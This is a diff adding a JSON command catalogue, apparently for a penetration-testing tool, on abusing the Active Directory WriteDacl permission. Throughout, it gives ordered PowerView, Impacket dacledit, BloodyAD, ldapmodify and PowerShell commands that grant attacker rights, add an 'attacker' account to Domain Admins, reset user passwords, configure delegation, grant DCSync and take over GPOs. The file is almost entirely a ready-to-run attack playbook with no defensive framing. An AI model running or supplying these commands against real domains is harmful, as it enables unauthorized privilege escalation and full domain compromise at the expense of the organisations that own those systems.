@@ -1,0 +1,148 @@
+{
+    "WriteDacl": {
+        "meaning": "With write access to the target object's DACL, you can grant yourself any privilege you want on the object. This allows you to modify permissions and gain full control over groups, users, computers, domains, GPOs, and OUs.",
+        "common": "",
+        "windows": {
+            "PowerView_Groups": [
+                {
+                    "order": 1,
+                    "command": "Import-Module PowerView",
+                    "description": "Import PowerView module"
+                },
+                {
+                    "order": 2,
+                    "command": "Add-DomainObjectAcl -TargetIdentity \"Domain Admins\" -Rights WriteMembers",
+                    "description": "Grant WriteMembers permission on Domain Admins group"
+                },
+                {
+                    "order": 3,
+                    "command": "Add-DomainGroupMember -Identity \"Domain Admins\" -Members \"attacker\"",
+                    "description": "Add attacker to Domain Admins group"
+                }
+            ],
+            "PowerView_Users": [
+                {
+                    "order": 1,
+                    "command": "Import-Module PowerView",
+                    "description": "Import PowerView module"
+                },
+                {
+                    "order": 2,
+                    "command": "Add-DomainObjectAcl -TargetIdentity harmj0y -Rights All",
+                    "description": "Grant full control over target user object"
+                },
+                {
+                    "order": 3,
+                    "command": "Set-DomainUserPassword -Identity harmj0y -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)",
+                    "description": "Reset target user password"
+                }
+            ],
+            "PowerView_Computers": [
+                {
+                    "order": 1,
+                    "command": "Import-Module PowerView",
+                    "description": "Import PowerView module"
+                },
+                {
+                    "order": 2,
+                    "command": "Add-DomainObjectAcl -TargetIdentity windows1 -Rights All",
+                    "description": "Grant full control over target computer object"
+                },
+                {
+                    "order": 3,
+                    "command": "Set-DomainObject -Identity windows1 -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$allowedToAct}",
+                    "description": "Configure resource-based constrained delegation"
+                }
+            ],
+            "PowerView_Domains": [
+                {
+                    "order": 1,
+                    "command": "Import-Module PowerView",
+                    "description": "Import PowerView module"
+                },
+                {
+                    "order": 2,
+                    "command": "Add-DomainObjectAcl -TargetIdentity testlab.local -Rights All",
+                    "description": "Grant full control over domain object"
+                },
+                {
+                    "order": 3,
+                    "command": "Add-DomainObjectAcl -TargetIdentity testlab.local -PrincipalIdentity attacker -Rights DCSync",
+                    "description": "Grant DCSync permissions on domain"
+                }
+            ],
+            "PowerView_GPOs": [
+                {
+                    "order": 1,
+                    "command": "Import-Module PowerView",
+                    "description": "Import PowerView module"
+                },
+                {
+                    "order": 2,
+                    "command": "Add-DomainObjectAcl -TargetIdentity TestGPO -Rights All",
+                    "description": "Grant full control over target GPO"
+                },
+                {
+                    "order": 3,
+                    "command": "# Modify GPO to add malicious settings or scripts",
+                    "description": "Modify GPO for privilege escalation or persistence"
+                }
+            ]
+        },
+        "linux": {
+            "Impacket_dacledit": [
+                {
+                    "order": 1,
+                    "command": "python3 dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target 'CN=Domain Admins,CN=Users,DC=domain,DC=com' domain.com/user:password",
+                    "description": "Grant FullControl permission on Domain Admins group using dacledit"
+                },
+                {
+                    "order": 2,
+                    "command": "python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'attacker' -target 'CN=Domain Admins,CN=Users,DC=domain,DC=com' domain.com/user:password",
+                    "description": "Grant WriteMembers permission on group"
+                }
+            ],
+            "BloodyAD": [
+                {
+                    "order": 1,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD add acl 'CN=Domain Admins,CN=Users,DC=domain,DC=com' 'attacker' 'FullControl'",
+                    "description": "Add FullControl ACE using BloodyAD"
+                },
+                {
+                    "order": 2,
+                    "command": "bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD add groupMember 'Domain Admins' 'attacker'",
+                    "description": "Add member to group after gaining permissions"
+                }
+            ],
+            "LDAP_Manual": [
+                {
+                    "order": 1,
+                    "command": "# Create LDIF file with ACL modification",
+                    "description": "Prepare LDAP modification file"
+                },
+                {
+                    "order": 2,
+                    "command": "echo -e \"dn: CN=Target,CN=Users,DC=domain,DC=com\\nchangetype: modify\\nreplace: nTSecurityDescriptor\\nnTSecurityDescriptor:: <base64_encoded_security_descriptor>\" > modify_acl.ldif",
+                    "description": "Create LDIF with modified security descriptor"
+                },
+                {
+                    "order": 3,
+                    "command": "ldapmodify -x -D 'CN=user,CN=Users,DC=domain,DC=com' -w password -h dc.domain.com -f modify_acl.ldif",
+                    "description": "Apply ACL modification using ldapmodify"
+                }
+            ],
+            "PowerShell_Core": [
+                {
+                    "order": 1,
+                    "command": "pwsh -c \"Import-Module ActiveDirectory\"",
+                    "description": "Import Active Directory module in PowerShell Core"
+                },
+                {
+                    "order": 2,
+                    "command": "pwsh -c \"$acl = Get-Acl 'AD:CN=Target,CN=Users,DC=domain,DC=com'; $accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule('attacker','FullControl','Allow'); $acl.SetAccessRule($accessRule); Set-Acl -Path 'AD:CN=Target,CN=Users,DC=domain,DC=com' -AclObject $acl\"",
+                    "description": "Modify ACL using PowerShell Core and AD module"
+                }
+            ]
+        }
+    }
+}
